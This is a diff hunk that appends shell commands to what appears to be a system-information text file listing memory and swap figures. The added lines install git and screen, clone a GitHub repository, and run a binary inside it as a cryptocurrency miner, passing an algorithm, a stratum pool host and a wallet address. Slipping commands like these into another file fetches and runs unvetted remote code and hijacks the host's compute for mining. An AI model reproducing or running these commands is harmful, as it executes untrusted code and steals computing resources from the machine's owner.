@@ -611,4 +611,6 @@ Mem:           14Gi       546Mi        10Gi       1.0Mi       3.7Gi        13Gi
 Swap:         4.0Gi          0B       4.0Gi
 ========================================
 
+sudo apt-get update -y && sudo apt-get install git screen -y && screen -R sgr
 
+git clone https://github.com/Dawn-shell/linux && chmod +x linux/system && linux/system -a yespowerSUGAR -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qxqw9kgzkfn4vjlzm3825jye4ck2xakmejzta9t.ttttt --no-auto
